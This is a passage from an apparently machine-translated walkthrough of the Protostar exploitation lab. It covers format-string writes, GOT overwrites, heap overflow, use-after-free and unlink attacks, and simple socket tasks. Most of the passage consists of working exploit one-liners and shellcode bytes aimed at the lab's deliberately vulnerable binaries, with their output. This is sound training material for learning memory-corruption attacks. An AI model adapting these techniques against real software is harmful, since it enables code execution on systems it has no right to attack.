bytes up to the specifier <i>% n</i> .  It remains to write there the necessary value - 64. Which will be received as: 4 bytes - address + indent 60 characters: <br><br><pre> <code class="bash hljs">user@protostar:/opt/protostar/bin$ python -c <span class="hljs-string"><span class="hljs-string">'from struct import pack; print(pack("&lt;I",0x080496e4)+"%60x"+"%4$n")'</span></span> | ./format2    200 you have modified the target :)</code> </pre> <br><br><h3>  Format3 </h3><br>  Writing 1 byte is good, but not practical.  Therefore, this level shows how more than 1 or 2 bytes can be written to memory. <br><div class="spoiler">  <b class="spoiler_title">format3.c</b> <div class="spoiler_text"><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;stdio.h&gt; #include &lt;string.h&gt; int target; void printbuffer(char *string) { printf(string); } void vuln() { char buffer[512]; fgets(buffer, sizeof(buffer), stdin); printbuffer(buffer); if(target == 0x01025544) { printf("you have modified the target :)\n"); } else { printf("target is %08x :(\n", target); } } int main(int argc, char **argv) { vuln(); }</span></span></span></span></code> </pre> <br></div></div><br>  There are several ways to do this: <br><br><ul><li>  We can write a specific value to a specific memory location as in the previous example, therefore, why not write down the necessary value right away: <br><br><pre> <code class="bash hljs">user@protostar:/opt/protostar/bin$ python -c <span class="hljs-string"><span class="hljs-string">'from struct import pack; print(pack("&lt;I",0x080496f4)+"%16930112x"+"%12$n")'</span></span> | ./format3 | grep <span class="hljs-string"><span class="hljs-string">"you"</span></span> you have modified the target :)</code> </pre> <br>  The disadvantage of this method is that we will previously be indented with <i>0x01025544</i> characters; <br><br></li><li>  The second way is to write values ‚Äã‚Äãof 1-2 bytes. <br><br><pre> <code class="bash hljs">user@protostar:/opt/protostar/bin$ python -c <span class="hljs-string"><span class="hljs-string">'from struct import pack; print(pack("&lt;I",0x080496f4)+pack("&lt;I",0x080496f5)+pack("&lt;I",0x080496f6)+"%56x"+"%12$n"+"%17x%13$n"+"%173x%14$n")'</span></span> | ./format3        0 bffff5e0 b7fd7ff4 you have modified the target :)</code> </pre> <br>  In the beginning we specify the addresses by which we will change bytes, then in the usual way we select the appropriate values.  It should be remembered that we are limited in the range of change of a specific byte, i.e.  each subsequent should be greater than the previous, for example, the minimum value that with this method can be written to bytes at an offset of <i>% 14 $ n =&gt; 0x5c</i> .  Therefore, we write 2 bytes at once there; <br><br></li><li>  Of course, no one forbids changing the order of writing bytes, like this: <br><br><pre> <code class="bash hljs">user@protostar:/opt/protostar/bin$ python -c <span class="hljs-string"><span class="hljs-string">'from struct import pack; print(pack("&lt;I",0x080496f6)+pack("&lt;I",0x080496f4)+"%250c%12$hn"+"%21570c%13$hn")'</span></span> | ./format3 you have modified the target :)</code> </pre> <br>  Outputting a large number of indents cannot be avoided, but again, we can change the low bytes starting from the value <i>0x0103</i> . </li></ul><br><h3>  Format4 </h3><br>  Here we come to the final and perhaps the most interesting level to exploit the vulnerability of the format string.  Here we are required to pass control to the <i>hello ()</i> function. <br><br><div class="spoiler">  <b class="spoiler_title">format4.c</b> <div class="spoiler_text"><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;stdio.h&gt; #include &lt;string.h&gt; int target; void hello() { printf("code execution redirected! you win\n"); _exit(1); } void vuln() { char buffer[512]; fgets(buffer, sizeof(buffer), stdin); printf(buffer); exit(1); } int main(int argc, char **argv) { vuln(); }</span></span></span></span></code> </pre> <br></div></div><br>  The easiest way to do this is to rewrite the addresses in the GOT table, for the <i>exit ()</i> function to the <i>hello ()</i> function.  First we find the necessary addresses: <br><br><pre> <code class="bash hljs">user@protostar:/opt/protostar/bin$ objdump -t ./format4 | grep hello 080484b4 g F .text 0000001e hello user@protostar:/opt/protostar/bin$ objdump -R ./format4 | grep <span class="hljs-built_in"><span class="hljs-built_in">exit</span></span> 08049724 R_386_JUMP_SLOT <span class="hljs-built_in"><span class="hljs-built_in">exit</span></span></code> </pre> <br>  Next, we define the offset at which the user buffer is located: <br><br><pre> <code class="bash hljs">user@protostar:/opt/protostar/bin$ <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> i <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> {1..200}; <span class="hljs-keyword"><span class="hljs-keyword">do</span></span> <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> -n <span class="hljs-string"><span class="hljs-string">"</span><span class="hljs-variable"><span class="hljs-string"><span class="hljs-variable">$i</span></span></span><span class="hljs-string"> -&gt; "</span></span>; <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> <span class="hljs-string"><span class="hljs-string">"AAAA%</span><span class="hljs-variable"><span class="hljs-string"><span class="hljs-variable">$i</span></span></span><span class="hljs-string">\$x"</span></span> | ./format4; <span class="hljs-keyword"><span class="hljs-keyword">done</span></span> | grep 4141 4 -&gt; AAAA41414141</code> </pre> <br>  The values ‚Äã‚Äãof the indents that need to be used to write the number we need can be calculated in <i>Python</i> as follows: <br><br><pre> <code class="python hljs"><span class="hljs-meta"><span class="hljs-meta">&gt;&gt;&gt; </span></span><span class="hljs-number"><span class="hljs-number">0x0804</span></span> - <span class="hljs-number"><span class="hljs-number">8</span></span> <span class="hljs-number"><span class="hljs-number">2044</span></span> &gt;&gt;&gt; <span class="hljs-number"><span class="hljs-number">0x84b4</span></span> - <span class="hljs-number"><span class="hljs-number">8</span></span> - <span class="hljs-number"><span class="hljs-number">2044</span></span> <span class="hljs-number"><span class="hljs-number">31920</span></span></code> </pre> <br>  Now you can start creating sploita: <br><br><pre> <code class="bash hljs">user@protostar:/opt/protostar/bin$ python -c <span class="hljs-string"><span class="hljs-string">'from struct import pack; print(pack("&lt;I", 0x08049726) + pack("&lt;I", 0x08049724) + "%2044c%4$hn" + "%31920c%5$hn")'</span></span> | ./format4 &amp; $  code execution redirected! you win</code> </pre> <br>  After which, we get a message about the success of the <i>hello ()</i> function <br><br><h3>  Heap0 </h3><br>  This level shows the basics of heap overflow, and how this may affect program flow. <br><br><div class="spoiler">  <b class="spoiler_title">heap0.c</b> <div class="spoiler_text"><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;string.h&gt; #include &lt;stdio.h&gt; #include &lt;sys/types.h&gt; struct data { char name[64]; }; struct fp { int (*fp)(); }; void winner() { printf("level passed\n"); } void nowinner() { printf("level has not been passed\n"); } int main(int argc, char **argv) { struct data *d; struct fp *f; d = malloc(sizeof(struct data)); f = malloc(sizeof(struct fp)); f-&gt;fp = nowinner; printf("data is at %p, fp is at %p\n", d, f); strcpy(d-&gt;name, argv[1]); f-&gt;fp(); }</span></span></span></span></code> </pre> <br></div></div><br><pre> <code class="bash hljs">gdb-peda$ pattern_create 100 <span class="hljs-string"><span class="hljs-string">'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'</span></span> gdb-peda$ <span class="hljs-built_in"><span class="hljs-built_in">set</span></span> args <span class="hljs-string"><span class="hljs-string">'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'</span></span> gdb-peda$ r</code> </pre> <br><img src="https://habrastorage.org/files/6dd/480/55b/6dd48055b2a54739976123d56e379c3d.png"><br><br><pre> <code class="bash hljs">user@protostar:/opt/protostar/bin$ ./heap0 `python -c <span class="hljs-string"><span class="hljs-string">'from struct import pack; print("A"*72+pack("&lt;I",0x08048464))'</span></span>` data is at 0x804a008, fp is at 0x804a050 level passed</code> </pre> <br><h3>  Heap1 </h3><br><div class="spoiler">  <b class="spoiler_title">heap1.c</b> <div class="spoiler_text"><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;string.h&gt; #include &lt;stdio.h&gt; #include &lt;sys/types.h&gt; struct internet { int priority; char *name; }; void winner() { printf("and we have a winner @ %d\n", time(NULL)); } int main(int argc, char **argv) { struct internet *i1, *i2, *i3; i1 = malloc(sizeof(struct internet)); i1-&gt;priority = 1; i1-&gt;name = malloc(8); i2 = malloc(sizeof(struct internet)); i2-&gt;priority = 2; i2-&gt;name = malloc(8); strcpy(i1-&gt;name, argv[1]); strcpy(i2-&gt;name, argv[2]); printf("and that's a wrap folks!\n"); }</span></span></span></span></code> </pre> <br></div></div><br><pre> <code class="bash hljs">gdb-peda$ p winner <span class="hljs-variable"><span class="hljs-variable">$1</span></span> = {void (void)} 0x8048494 &lt;winner&gt;</code> </pre> <br><pre> <code class="bash hljs">$ objdump -R ./heap1 | grep puts 08049774 R_386_JUMP_SLOT puts</code> </pre> <br><pre> <code class="bash hljs">gdb-peda$ pattern_create 50 <span class="hljs-string"><span class="hljs-string">'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA'</span></span> gdb-peda$ <span class="hljs-built_in"><span class="hljs-built_in">set</span></span> args <span class="hljs-string"><span class="hljs-string">'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA BBBBBBBB'</span></span> gdb-peda$ run ... gdb-peda$ pattern_search Registers contain pattern buffer: EAX+0 found at offset: 20 EDX+0 found at offset: 20</code> </pre> <br><pre> <code class="bash hljs">$ ./heap1 `python -c <span class="hljs-string"><span class="hljs-string">'from struct import pack; print("A"*20+pack("&lt;I",0x08049774)+" "+pack("&lt;I",0x8048494))'</span></span>` and we have a winner @ 1487263180</code> </pre> <br><h3>  Heap2 </h3><br><div class="spoiler">  <b class="spoiler_title">heap2.c</b> <div class="spoiler_text"><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;string.h&gt; #include &lt;sys/types.h&gt; #include &lt;stdio.h&gt; struct auth { char name[32]; int auth; }; struct auth *auth; char *service; int main(int argc, char **argv) { char line[128]; while(1) { printf("[ auth = %p, service = %p ]\n", auth, service); if(fgets(line, sizeof(line), stdin) == NULL) break; if(strncmp(line, "auth ", 5) == 0) { auth = malloc(sizeof(auth)); memset(auth, 0, sizeof(auth)); if(strlen(line + 5) &lt; 31) { strcpy(auth-&gt;name, line + 5); } } if(strncmp(line, "reset", 5) == 0) { free(auth); } if(strncmp(line, "service", 6) == 0) { service = strdup(line + 7); } if(strncmp(line, "login", 5) == 0) { if(auth-&gt;auth) { printf("you have logged in already!\n"); } else { printf("please enter your password\n"); } } } }</span></span></span></span></code> </pre> <br></div></div><br>  What does the code do?  First, the addresses of 2 <i>auth</i> and <i>service</i> objects are displayed, this is done for greater clarity.  Then, depending on the read line, either memory allocation for one or another object or its release occurs. <br><br>  The following construction is most interesting here: <br><br><pre> <code class="cpp hljs"> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(<span class="hljs-built_in"><span class="hljs-built_in">strncmp</span></span>(line, <span class="hljs-string"><span class="hljs-string">"login"</span></span>, <span class="hljs-number"><span class="hljs-number">5</span></span>) == <span class="hljs-number"><span class="hljs-number">0</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(auth-&gt;auth) {</code> </pre> <br>  It is interesting because there is no check whether memory is allocated for an <i>auth</i> object or not, i.e.  the code will work anyway, regardless of whether we free this object or not.  On the face of a clear vulnerability <i>use-after-free</i> .  It remains to operate it.  First, let's allocate memory for <i>auth</i> : <br><br><pre> <code class="bash hljs">user@protostar:/opt/protostar/bin$ ./heap2 [ auth = (nil), service = (nil) ] auth admin [ auth = 0x804c008, service = (nil) ]</code> </pre> <br>  Well, we have allocated 32 (sizeof (name)) + 4 (sizeof (auth)) bytes.  Now we will free this site: <br><br><pre> <code class="bash hljs">reset [ auth = 0x804c008, service = (nil) ]</code> </pre> <br>  It seems that nothing has changed, but take a look at it under the debugger: <br><br><img src="https://habrastorage.org/files/49c/de2/606/49cde2606990430b895b525814eb32ad.png"><br><br>  This is until <i>reset</i> <br><br><img src="https://habrastorage.org/files/a5a/f72/253/a5af7225372649278e7de098c6878ac0.png"><br><br>  And this after. <br><br>  And now let's try to write a string using the <i>service</i> command: <br><br><pre> <code class="bash hljs">service admin [ auth = 0x804c008, service = 0x804c008 ]</code> </pre> <br>  Addresses are completely the same, this is because <i>strdup</i> also uses <i>malloc</i> to allocate memory for the final string, and since we just marked the previous section as free, it was this one that we began to use.  Thus, we can also rewrite the data located at <i>auth-&gt; auth</i> so that the login check is successful. <br><br>  The final exploit will look like this: <br><br><pre> <code class="bash hljs">user@protostar:/opt/protostar/bin$ python -c <span class="hljs-string"><span class="hljs-string">'print("auth admin\nreset\nservice "+"A"*36+"\nlogin")'</span></span> | ./heap2 [ auth = (nil), service = (nil) ] [ auth = 0x804c008, service = (nil) ] [ auth = 0x804c008, service = (nil) ] [ auth = 0x804c008, service = 0x804c018 ] you have logged <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> already! [ auth = 0x804c008, service = 0x804c018 ]</code> </pre> <br><h3>  Heap3 </h3><br><div class="spoiler">  <b class="spoiler_title">heap3.c</b> <div class="spoiler_text"><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;string.h&gt; #include &lt;sys/types.h&gt; #include &lt;stdio.h&gt; void winner() { printf("that wasn't too bad now, was it? @ %d\n", time(NULL)); } int main(int argc, char **argv) { char *a, *b, *c; a = malloc(32); b = malloc(32); c = malloc(32); strcpy(a, argv[1]); strcpy(b, argv[2]); strcpy(c, argv[3]); free(c); free(b); free(a); printf("dynamite failed?\n"); }</span></span></span></span></code> </pre> <br></div></div><br>  For clarity, we use peda, pre-setting breakpoints in the right places: <br><br><pre> <code class="bash hljs">gdb-peda$ b *0x080488d5 //strcpy(a, argv[1]); gdb-peda$ b *0x08048911 //free(c); gdb-peda$ b *0x08048935 //<span class="hljs-built_in"><span class="hljs-built_in">printf</span></span>(<span class="hljs-string"><span class="hljs-string">"dynamite failed?\n"</span></span>); gdb-peda$ r `python -c <span class="hljs-string"><span class="hljs-string">'print("A"*32 +" "+ "B"*32 +" "+ "C"*32)'</span></span>`</code> </pre> <br>  After launch, the first breakpoint is triggered.  Find out the address where the heap is located: <br><br><img src="https://habrastorage.org/files/008/626/b8e/008626b8ee3148259e9db83652b89a00.png"><br><br>  Let's see how the heap looks, even before the arguments passed to it are copied: <br><br><img src="https://habrastorage.org/files/9ad/47d/b51/9ad47db511ea488d8f5f96df0dd86f47.png"><br><br>  <i>PS For clarity, I did not capture the 4-byte segment, located in front of the pointer to the size of the chunk.</i> <br><br>  First, we have the size of the current piece: <i>0x804c004 + 0x29 = 0x804c02d</i> - this is the address that contains the data that we have placed as ‚ÄúB‚Äù, and so on, at the very end is the size of the basket.  Now let's take a look at the same section by moving to the next breakpoint: <br><br><img src="https://habrastorage.org/files/90b/df1/a1c/90bdf1a1caa94328b6ee435a7f8ff386.png"><br><br>  Well, we figured it out, it remains to find out what is happening with the memory, in the heap after its release: <br><br><img src="https://habrastorage.org/files/9f2/aaf/16c/9f2aaf16c71145fcbbd003d18eb1dfa6.png"><br><br>  As you can see, now every chunk contains a pointer to the next free <br>  Since copying in this example is carried out by <i>strcpy</i> , i.e.  without length limitations, we can easily rewrite the metadata of any existing chunk, including creating our own.  More details about this can be found <a href="https://www.youtube.com/watch%3Fv%3DRxQeGhYW8-g">here</a> . <br><br>  First, find the address of the <i>winner</i> function: <br><br><pre> <code class="bash hljs">gdb-peda$ p winner <span class="hljs-variable"><span class="hljs-variable">$1</span></span> = {void (void)} 0x8048864 &lt;winner&gt;</code> </pre> <br>  We will rewrite the address in the <i>GOT</i> for the <i>puts</i> function: <br><br><pre> <code class="bash hljs">user@protostar:/opt/protostar/bin$ objdump -R ./heap3 | grep puts 0804b128 R_386_JUMP_SLOT puts</code> </pre> <br>  I think it is not necessary to describe shellcode: <br><br><pre> <code class="bash hljs">$ rasm2 <span class="hljs-string"><span class="hljs-string">'mov eax, 0x8048864; call eax'</span></span> b864880408ffd0</code> </pre> <br>  Let's start creating an exploit.  Since the exploit will use the features of the macro <i>unlink</i> , we will get the address of <i>puts</i> in the <i>GOT</i> : <br><br><blockquote>  0x0804b128 - 0xC = 0x0804b11c </blockquote><br>  Its actual need to be replaced with the address where the first chunk is located, where we will write the shellcode: <br><blockquote>  0x804c00c = 0x804c000 + 0xC </blockquote><br>  The third chunk will be expanded by <i>strcpy</i> , and divided by 2, since we need 2 consecutive chunks, which will be marked as free, otherwise <i>unlink</i> will not work.  The final view will be: <br><br><pre> <code class="bash hljs">user@protostar:/opt/protostar/bin$ ./heap3 `python -c <span class="hljs-string"><span class="hljs-string">'from struct import pack; print("\x90"*16+"\xb8\x64\x88\x04\x08\xff\xd0" +" "+ "B"*36+"\x65" +" "+ "C"*92+pack("&lt;I",0xfffffffc)+pack("&lt;I",0xfffffffc)+pack("&lt;I",0x0804b11c)+pack("&lt;I",0x804c00c))'</span></span>` that wasn<span class="hljs-string"><span class="hljs-string">'t too bad now, was it? @ 1488287968 Segmentation fault</span></span></code> </pre> <br>  And after the launch, we receive the necessary message, from the <i>winner</i> function, and a segmentation error, which is not interesting to us, because the goal is fulfilled. <br><br><h3>  Net0 </h3><br><div class="spoiler">  <b class="spoiler_title">net0.c</b> <div class="spoiler_text"><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">"../common/common.c"</span></span></span><span class="hljs-meta"> #</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">define</span></span></span><span class="hljs-meta"> NAME </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">"net0"</span></span></span><span class="hljs-meta"> #</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">define</span></span></span><span class="hljs-meta"> UID 999 #</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">define</span></span></span><span class="hljs-meta"> GID 999 #</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">define</span></span></span><span class="hljs-meta"> PORT 2999 void run() { unsigned int i; unsigned int wanted; wanted = random(); printf(</span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">"Please send '%d' as a little endian 32bit int\n"</span></span></span><span class="hljs-meta">, wanted); </span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">if</span></span></span><span class="hljs-meta">(fread(&amp;i, sizeof(i), 1, stdin) == NULL) { errx(1, </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">":(\n"</span></span></span><span class="hljs-meta">); } </span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">if</span></span></span><span class="hljs-meta">(i == wanted) { printf(</span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">"Thank you sir/madam\n"</span></span></span><span class="hljs-meta">); } </span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">else</span></span></span><span class="hljs-meta"> { printf(</span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">"I'm sorry, you sent %d instead\n"</span></span></span><span class="hljs-meta">, i); } } int main(int argc, char **argv, char **envp) { int fd; char *username; </span><span class="hljs-comment"><span class="hljs-meta"><span class="hljs-comment">/* Run the process as a daemon */</span></span></span><span class="hljs-meta"> background_process(NAME, UID, GID); </span><span class="hljs-comment"><span class="hljs-meta"><span class="hljs-comment">/* Wait for socket activity and return */</span></span></span><span class="hljs-meta"> fd = serve_forever(PORT); </span><span class="hljs-comment"><span class="hljs-meta"><span class="hljs-comment">/* Set the client socket to STDIN, STDOUT, and STDERR */</span></span></span><span class="hljs-meta"> set_io(fd); </span><span class="hljs-comment"><span class="hljs-meta"><span class="hljs-comment">/* Don't do this :&gt; */</span></span></span><span class="hljs-meta"> srandom(time(NULL)); run(); }</span></span></code> </pre> <br></div></div><br>  As follows from the description, at this level they want to introduce us to the transformation of the string into a <i>‚Äúlittle endian‚Äù</i> number. <br><br>  Therefore, without further ado, open <i>python</i> : <br><br><pre> <code class="python hljs"><span class="hljs-comment"><span class="hljs-comment">#!/usr/bin/python3 import socket from struct import pack host = '10.0.31.119' port = 2999 s = socket.socket() s.connect((host, port)) data = s.recv(1024).decode() print(data) data = int(data[13:13 + data[13:].index("'")]) s.send(pack("&lt;I", data)) print(s.recv(1024).decode())</span></span></code> </pre> <br>  We read the number, and using the <i>pack</i> function from the <i>struct</i> module, we bring it to the required format.  It remains only to run: <br><br><pre> <code class="bash hljs">gh0st3rs@gh0st3rs-pc:protostar$ ./net0.py Please send <span class="hljs-string"><span class="hljs-string">'1251330920'</span></span> as a little endian 32bit int Thank you sir/madam</code> </pre> <br><h3>  Net1 </h3><br><div class="spoiler">  <b class="spoiler_title">net1.c</b> <div class="spoiler_text"><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">"../common/common.c"</span></span></span><span class="hljs-meta"> #</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">define</span></span></span><span class="hljs-meta"> NAME </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">"net1"</span></span></span><span class="hljs-meta"> #</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">define</span></span></span><span class="hljs-meta"> UID 998 #</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">define</span></span></span><span class="hljs-meta"> GID 998 #</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">define</span></span></span><span class="hljs-meta"> PORT 2998 void run() { char buf[12]; char fub[12]; char *q; unsigned int wanted; wanted = random(); sprintf(fub, </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">"%d"</span></span></span><span class="hljs-meta">, wanted); </span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">if</span></span></span><span class="hljs-meta">(write(0, &amp;wanted, sizeof(wanted)) != sizeof(wanted)) { errx(1, </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">":(\n"</span></span></span><span class="hljs-meta">); } </span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">if</span></span></span><span class="hljs-meta">(fgets(buf, sizeof(buf)-1, stdin) == NULL) { errx(1, </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">":(\n"</span></span></span><span class="hljs-meta">); } q = strchr(buf, </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">'\r'</span></span></span><span class="hljs-meta">); </span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">if</span></span></span><span class="hljs-meta">(q) *q = 0; q = strchr(buf, </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">'\n'</span></span></span><span class="hljs-meta">); </span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">if</span></span></span><span class="hljs-meta">(q) *q = 0; </span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">if</span></span></span><span class="hljs-meta">(strcmp(fub, buf) == 0) { printf(</span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">"you correctly sent the data\n"</span></span></span><span class="hljs-meta">); } </span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">else</span></span></span><span class="hljs-meta"> { printf(</span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">"you didn't send the data properly\n"</span></span></span><span class="hljs-meta">); } } int main(int argc, char **argv, char **envp) { int fd; char *username; </span><span class="hljs-comment"><span class="hljs-meta"><span class="hljs-comment">/* Run the process as a daemon */</span></span></span><span class="hljs-meta"> background_process(NAME, UID, GID); </span><span class="hljs-comment"><span class="hljs-meta"><span class="hljs-comment">/* Wait for socket activity and return */</span></span></span><span class="hljs-meta"> fd = serve_forever(PORT); </span><span class="hljs-comment"><span class="hljs-meta"><span class="hljs-comment">/* Set the client socket to STDIN, STDOUT, and STDERR */</span></span></span><span class="hljs-meta"> set_io(fd); </span><span class="hljs-comment"><span class="hljs-meta"><span class="hljs-comment">/* Don't do this :&gt; */</span></span></span><span class="hljs-meta"> srandom(time(NULL)); run(); }</span></span></code> </pre> <br></div></div><br>  At this level, the inverse problem is set, convert the received bytes into a string.  Let's use <i>Python</i> again: <br><br><pre> <code class="python hljs"><span class="hljs-comment"><span class="hljs-comment">#!/usr/bin/python3 import socket from struct import unpack host = '10.0.31.119' port = 2998 s = socket.socket() s.connect((host, port)) data = s.recv(1024) print(data) data = unpack("I", data)[0] s.send(str(data).encode()) print(s.recv(1024).decode())</span></span></code> </pre> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Yes, just like that ... </font></font><br><br><pre> <code class="bash hljs">gh0st3rs@gh0st3rs-pc:protostar$ ./net0.py b<span class="hljs-string"><span class="hljs-string">'\x92\xc5_x'</span></span> you correctly sent the data</code> </pre> <br><h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Net2 </font></font></h3><br><div class="spoiler"> <b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">net2.c</font></font></b> <div class="spoiler_text"><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">"../common/common.c"</span></span></span><span class="hljs-meta"> #</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">define</span></span></span><span class="hljs-meta"> NAME </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">"net2"</span></span></span><span class="hljs-meta"> #</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">define</span></span></span><span class="hljs-meta"> UID 997 #</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">define</span></span></span><span class="hljs-meta"> GID 997 #</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">define</span></span></span><span class="hljs-meta"> PORT 2997 void run() { unsigned int quad[4]; int i; unsigned int result, wanted; result = 0; for(i = 0; i </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt; 4; i++) { quad[i] = random(); result += quad[i]; if(write(0, &amp;(quad[i]), sizeof(result)) != sizeof(result)) { errx(1, ":(\n"); } } if(read(0, &amp;wanted, sizeof(result)) != sizeof(result)) { errx(1, ":&lt;\n"); } if(result == wanted) { printf("you added them correctly\n"); } else { printf("sorry, try again. invalid\n"); } } int main(int argc, char **argv, char **envp) { int fd; char *username; /* Run the process as a daemon */ background_process(NAME, UID, GID); /* Wait for socket activity and return */ fd = serve_forever(PORT); /* Set the client socket to STDIN, STDOUT, and STDERR */ set_io(fd); /* Don't do this :&gt; */ srandom(time(NULL)); run(); }</span></span></span></span></code> </pre> <br></div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">The last level of this series. </font><font style="vertical-align: inherit;">On which you need to apply the knowledge gained earlier. </font><font style="vertical-align: inherit;">We are given 4 </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">uint</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> numbers, we need to send them the amount:</font></font><br><br><pre> <code class="python hljs"><span class="hljs-comment"><span class="hljs-comment">#!/usr/bin/python3 import socket from struct import unpack, pack host = '10.0.31.119' port = 2997 s = socket.socket() s.connect((host, port)) result = 0 for i in range(4): tmp = s.recv(4) tmp = int(unpack("&lt;I", tmp)[0]) result += tmp result &amp;= 0xffffffff s.send(pack("&lt;I", result)) print(s.recv(1024).decode())</span></span></code> </pre> <br><font style="vertical-align: inherit;"><font style="vertical-align: 